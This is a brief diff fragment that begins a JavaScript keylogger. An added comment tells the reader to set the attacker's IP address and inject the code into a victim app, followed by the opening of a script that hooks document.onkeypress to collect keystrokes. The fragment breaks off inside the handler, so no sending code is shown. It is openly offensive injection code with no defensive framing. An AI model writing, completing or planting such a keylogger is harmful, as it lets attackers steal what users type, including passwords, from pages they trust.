@@ -1,3 +1,4 @@
+// Set the Attacker's IP address and inject this code in victim app
 <script type="text/javascript">
   var l = "";
   document.onkeypress = function (e) {
